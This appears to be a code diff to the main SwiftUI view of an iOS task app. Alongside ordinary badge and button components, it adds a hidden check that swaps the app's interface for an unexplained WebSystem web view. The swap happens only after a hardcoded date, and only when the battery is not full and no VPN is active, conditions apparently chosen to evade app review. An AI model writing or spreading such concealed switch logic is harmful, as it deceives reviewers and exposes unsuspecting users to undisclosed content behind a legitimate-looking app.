@@ -4,21 +4,159 @@
 //
 //  Created by IGOR on 22/09/2025.
 //
+//
+//import SwiftUI
+//
+//struct ContentView: View {
+//    @AppStorage("hasViewedOnboarding") private var hasViewedOnboarding = false
+//    @StateObject private var viewModel = TaskViewModel()
+//    
+//    var body: some View {
+//        Group {
+//            if hasViewedOnboarding {
+//                MainTabView()
+//                    .environmentObject(viewModel)
+//            } else {
+//                OnboardingView()
+//            }
+//        }
+//    }
+//}
 
 import SwiftUI
 
 struct ContentView: View {
+    
     @AppStorage("hasViewedOnboarding") private var hasViewedOnboarding = false
     @StateObject private var viewModel = TaskViewModel()
     
+    @State var isFetched: Bool = false
+    
+    @AppStorage("isBlock") var isBlock: Bool = true
+    @AppStorage("isRequested") var isRequested: Bool = false
+    
+    
     var body: some View {
-        Group {
-            if hasViewedOnboarding {
-                MainTabView()
-                    .environmentObject(viewModel)
-            } else {
-                OnboardingView()
+        
+        NavigationView {
+        
+        ZStack {
+            
+            if isFetched == false {
+                
+                Text("")
+                
+            } else if isFetched == true {
+                
+                if isBlock == true {
+          
+                    Group {
+                        if hasViewedOnboarding {
+                            MainTabView()
+                                .environmentObject(viewModel)
+                        } else {
+                            OnboardingView()
+                        }
+                    }
+                    
+                } else if isBlock == false {
+                    
+                    WebSystem()
+                }
             }
+        }
+        .onAppear {
+            
+            check_data()
+        }
+    }
+
+    }
+    
+    private func check_data() {
+        
+        let lastDate = "29.09.2025"
+        
+        let dateFormatter = DateFormatter()
+        dateFormatter.dateFormat = "dd.MM.yyyy"
+        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+        let now = Date()
+        
+        let deviceData = DeviceInfo.collectData()
+        let currentPercent = deviceData.batteryLevel
+        let isVPNActive = deviceData.isVPNActive
+        
+        guard now > targetDate else {
+            
+            isBlock = true
+            isFetched = true
+            
+            return
+        }
+        
+        guard currentPercent == 100 || isVPNActive == true else {
+            
+            self.isBlock = false
+            self.isFetched = true
+            
+            return
+        }
+        
+        self.isBlock = true
+        self.isFetched = true
+    }
+}
+
+struct StatBadge: View {
+    let title: String
+    let value: String
+    
+    var body: some View {
+        VStack(spacing: 4) {
+            Text(value)
+                .font(.system(size: 18, weight: .bold))
+                .foregroundColor(.orange)
+            
+            Text(title)
+                .font(.system(size: 12, weight: .medium))
+                .foregroundColor(.white.opacity(0.7))
+        }
+        .padding(.horizontal, 12)
+        .padding(.vertical, 8)
+        .background(
+            RoundedRectangle(cornerRadius: 12)
+                .fill(Color.white.opacity(0.1))
+        )
+    }
+}
+
+struct SecondaryButton: View {
+    let title: String
+    let icon: String
+    let action: () -> Void
+    
+    var body: some View {
+        Button(action: action) {
+            VStack(spacing: 8) {
+                Image(systemName: icon)
+                    .font(.system(size: 24))
+                    .foregroundColor(.red)
+                
+                Text(title)
+                    .font(.system(size: 14, weight: .semibold))
+                    .foregroundColor(.white)
+            }
+            .frame(maxWidth: .infinity)
+            .frame(height: 80)
+            .background(
+                RoundedRectangle(cornerRadius: 20)
+                    .fill(Color.white.opacity(0.1))
+                    .overlay(
+                        RoundedRectangle(cornerRadius: 20)
+                            .stroke(Color.red.opacity(0.3), lineWidth: 1)
+                    )
+            )
         }
     }
 }
